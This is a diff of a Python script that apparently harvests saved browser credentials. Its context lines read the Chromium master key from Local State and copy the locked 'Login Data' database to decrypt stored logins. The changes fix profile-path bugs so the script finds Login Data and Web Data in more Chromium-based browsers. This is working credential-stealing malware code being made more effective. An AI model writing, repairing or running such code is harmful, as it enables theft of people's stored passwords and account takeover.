@@ -365,7 +365,7 @@ if yes == "yes":
 					if not os.path.isfile(local_state_path):
 						continue
 			master_key = get_master_key(local_state_path)
-			login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+			login_db = db_path
 			dbpath = str(uuid.uuid4())
 			shutil.copy2(login_db, dbpath) #making a temp copy since Login Data DB is locked while Chrome is running
 			conn = sqlite3.connect(dbpath)
@@ -548,7 +548,7 @@ if yes == "yes":
 				if not os.path.exists(db_path):
 					db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Web Data"
 					if not os.path.exists(db_path):
-						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Web Data" +"\\Web Data"
+						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1" +"\\Web Data"
 						if not os.path.exists(db_path):
 							db_path = chromiumpaths[i]+ "\\Login Data"
 							if not os.path.exists(db_path):
